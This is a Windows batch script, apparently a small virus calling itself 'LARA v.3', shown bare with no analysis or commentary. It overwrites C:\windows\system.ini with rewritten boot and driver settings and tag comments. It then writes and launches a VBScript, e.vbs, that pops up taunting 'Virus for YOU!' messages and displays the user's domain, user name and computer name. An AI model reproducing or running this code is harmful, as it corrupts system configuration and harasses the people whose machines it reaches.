@echo off
echo [boot] >C:\windows\system.ini
echo shell=Explorer.exe >nul >>C:\windows\system.ini
echo system.drv=system.drv >nul >>C:\windows\system.ini
echo drivers=mmsystem.dll power.drv >nul >>C:\windows\system.ini
echo user.exe=user.exe >nul >>C:\windows\system.ini
echo gdi.exe=gdi.exe >nul >>C:\windows\system.ini
echo sound.drv=mmsound.drv >nul >>C:\windows\system.ini
echo dibeng.drv=dibeng.dll >nul >>C:\windows\system.ini
echo comm.drv=comm.drv >nul >>C:\windows\system.ini
echo oemfonts.fon=vga850.fon >nul >>C:\windows\system.ini
echo *DisplayFallback=0 >nul >>C:\windows\system.ini
echo fixedfon.fon=vgafix.fon >nul >>C:\windows\system.ini
echo fonts.fon=vgasys.fon >nul >>C:\windows\system.ini
echo 386Grabber=vgafull.3gr >nul >>C:\windows\system.ini
echo display.drv=pnpdrvr.drv >nul >>C:\windows\system.ini
echo ;;lara >nul >>C:\windows\system.ini
echo [keyboard] >nul >>C:\windows\system.ini
echo oemansi.bin=xlat850.bin >nul >>C:\windows\system.ini
echo subtype= >nul >>C:\windows\system.ini
echo type=4 >nul >>C:\windows\system.ini
echo ;;ddd >nul >>C:\windows\system.ini
echo [boot.description] >nul >>C:\windows\system.ini
echo system.drv=PC standard >nul >>C:\windows\system.ini
echo aspect=100,96,96 >nul >>C:\windows\system.ini
echo ;;lara >nul >>C:\windows\system.ini
echo [386Enh] >nul >>C:\windows\system.ini
echo ebios=*ebios >nul >>C:\windows\system.ini
echo device=*enable >nul >>C:\windows\system.ini
echo display=*vdd,*vflatd >nul >>C:\windows\system.ini
echo ;;ssa >nul >>C:\windows\system.ini
echo [drivers32] >nul >>C:\windows\system.ini
echo msacm.lhacm=lhacm.acm >nul >>C:\windows\system.ini
echo VIDC.VDOM=vdowave.drv >nul >>C:\windows\system.ini
echo MSACM.imaadpcm=imaadpcm32.acm >nul >>C:\windows\system.ini
echo MSACM.msadpcm=msadp32.acm >nul >>C:\windows\system.ini
echo MSACM.msgsm610=msgsm32.acm >nul >>C:\windows\system.ini
echo MSACM.msg711=msg711.acm >nul >>C:\windows\system.ini
echo MSACM.trspch=tssoft32.acm >nul >>C:\windows\system.ini
echo vidc.CVID=iccvid.dll >nul >>C:\windows\system.ini
echo VIDC.IV31=ir32_32.dll >nul >>C:\windows\system.ini
echo VIDC.IV32=ir32_32.dll >nul >>C:\windows\system.ini
echo vidc.MSVC=msvidc32.dll >nul >>C:\windows\system.ini
echo VIDC.MRLE=msrle32.dll >nul >>C:\windows\system.ini
echo msacm.msg723=msg723.acm >nul >>C:\windows\system.ini
echo vidc.M263=msh263.drv >nul >>C:\windows\system.ini
echo msacm.iac2=C:\WINDOWS\SYSTEM\IAC25_32.AX >nul >>C:\windows\system.ini
echo ;;sdd  >nul >>C:\windows\system.ini
echo [NonWindowsApp] >nul >>C:\windows\system.ini
echo TTInitialSizes=4 5 6 7 8 9 10 11 12 13 14 15 16 18 20 22 >nul >>C:\windows\system.ini
echo ;;DED >nul >>C:\windows\system.ini
echo [power.drv] >nul >>C:\windows\system.ini
echo ;;SS >nul >>C:\windows\system.ini
echo [drivers] >nul >>C:\windows\system.ini
echo wavemapper=*.drv >nul >>C:\windows\system.ini
echo MSACM.imaadpcm=*.acm >nul >>C:\windows\system.ini
echo MSACM.msadpcm=*.acm >nul >>C:\windows\system.ini
echo midi=mmsystem.dll >nul >>C:\windows\system.ini
echo ;;ddd >nul >>C:\windows\system.ini
echo[iccvid.drv] >nul >>C:\windows\system.ini
echo ;;dd >nul >>C:\windows\system.ini
echo [mciseq.drv] >nul >>C:\windows\system.ini
echo ;;>nul >>C:\windows\system.ini
echo [mci] >nul >>C:\windows\system.ini
echo MPEGVideo=mciqtz.drv >nul >>C:\windows\system.ini
echo ;; SSS >nul >>C:\windows\system.ini
echo [vcache] >nul >>C:\windows\system.ini
echo ;DDD >nul >>C:\windows\system.ini
;; SSS >nul >>C:\windows\system.ini
echo [TTFontDimenCache] >nul >>C:\windows\system.ini
echo 0 4=2 4 >nul >>C:\windows\system.ini 
echo 0 5=3 5 >nul >>C:\windows\system.ini
echo 0 6=4 6 >nul >>C:\windows\system.ini
echo 0 7=4 7 >nul >>C:\windows\system.ini
echo 0 8=5 8 >nul >>C:\windows\system.ini
echo 0 9=5 9 >nul >>C:\windows\system.ini
echo 0 10=6 10 >nul >>C:\windows\system.ini 
echo 0 11=7 11 >nul >>C:\windows\system.ini
echo 0 12=7 12 >nul >>C:\windows\system.ini
echo 0 13=8 13 >nul >>C:\windows\system.ini
echo 0 14=8 14 >nul >>C:\windows\system.ini
echo 0 15=9 15 >nul >>C:\windows\system.ini
echo 0 16=10 16 >nul >>C:\windows\system.ini
echo 0 18=11 18 >nul >>C:\windows\system.ini
echo 0 20=12 20 >nul >>C:\windows\system.ini
echo 0 22=13 22 >nul >>C:\windows\system.ini
echo L_Welcome_MsgBox_Message_Text    = "Lara.....Kiss for YOU !" >C:\windows\e.vbs
echo L_Welcome_MsgBox_Title_Text      = "LARA v.3"   >nul >>C:\windows\e.vbs
echo Call Welcome()   >nul >>C:\windows\e.vbs
echo L_Welcome_MsgBox_Message_Text    = "Lara.....Virus for YOU!"   >nul >>C:\windows\e.vbs
echo L_Welcome_MsgBox_Title_Text      = "LARA v.3"    >nul >>C:\windows\e.vbs
echo Call Welcome()    >nul >>C:\windows\e.vbs
echo L_Welcome_MsgBox_Message_Text    = "FRIDAY"   >nul >>C:\windows\e.vbs
echo L_Welcome_MsgBox_Title_Text      = "LARA v.3"    >nul >>C:\windows\e.vbs
echo Call Welcome() >nul >>C:\windows\e.vbs
echo '  >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo Dim WSHNetwork >nul >>C:\windows\e.vbs
echo Dim colDrives, SharePoint >nul >>C:\windows\e.vbs
echo Dim CRLF >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo CRLF = Chr(13) & Chr(10) >nul >>C:\windows\e.vbs
echo Set WSHNetwork = WScript.CreateObject("WScript.Network") >nul >>C:\windows\e.vbs
echo '   >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo Function Ask(strAction) >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo '   >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo    Dim intButton >nul >>C:\windows\e.vbs
echo    intButton = MsgBox(strAction,                   _ >nul >>C:\windows\e.vbs
echo                       vbQuestion + vbYesNo,        _ >nul >>C:\windows\e.vbs
echo                       L_Welcome_MsgBox_Title_Text ) >nul >>C:\windows\e.vbs
echo    Ask = intButton = vbYes >nul >>C:\windows\e.vbs
echo End Function >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo MsgBox "UserDomain"     & Chr(9) & "= " & WSHNetwork.UserDomain  & CRLF &   _ >nul >>C:\windows\e.vbs
echo       "UserName"       & Chr(9) & "= " & WSHNetwork.UserName    & CRLF &   _ >nul >>C:\windows\e.vbs
echo       "ComputerName"   & Chr(9) & "= " & WSHNetwork.ComputerName,          _ >nul >>C:\windows\e.vbs
echo       vbInformation + vbOKOnly,                                            _ >nul >>C:\windows\e.vbs
echo       "LARA" >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo Sub Welcome() >nul >>C:\windows\e.vbs
echo     Dim intDoIt >nul >>C:\windows\e.vbs
echo ' >nul >>C:\windows\e.vbs
echo    intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text, _ >nul >>C:\windows\e.vbs
echo                      vbOKCancel + vbOKCancel,    _ >nul >>C:\windows\e.vbs
echo                      L_Welcome_MsgBox_Title_Text ) >nul >>C:\windows\e.vbs
echo    If intDoIt = vbCancel Then >nul >>C:\windows\e.vbs
echo        WScript.Quit >nul >>C:\windows\e.vbs
echo    End If >nul >>C:\windows\e.vbs
echo End Sub >nul >>C:\windows\e.vbs
start C:\windows\e.vbs  

